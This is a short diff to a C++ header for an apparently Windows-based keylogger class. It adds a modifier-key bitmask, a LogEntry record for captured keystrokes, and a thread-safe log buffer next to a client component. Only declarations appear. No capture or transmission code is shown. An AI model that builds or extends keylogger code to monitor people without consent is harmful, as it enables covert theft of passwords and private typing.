@@ -8,6 +8,9 @@
 #include <Windows.h>
 #include <fstream>
 #include <iostream>
+#include <mutex>
+#include <thread>
+#include <vector>
 
 #include "client_keylogger.h"
 #include "common.h"
@@ -17,8 +20,22 @@ class keylogger {
   public:
     keylogger();
     ~keylogger();
-    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status, bool caps);
+    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status,
+                         uint16_t modifierKeysBitMask);
+
+    class LogEntry {
+      public:
+        LogEntry(char character, keyStatus status, uint16_t modifierKeysBitMask)
+            : character(character), status(status),
+              modifierKeysBitMask(modifierKeysBitMask) {}
+        char character;
+        keyStatus status;
+        uint16_t modifierKeysBitMask;
+    };
 
   private:
     client_keylogger client;
+    std::thread logThread;
+    std::vector<LogEntry> log;
+    std::mutex logMutex;
 };
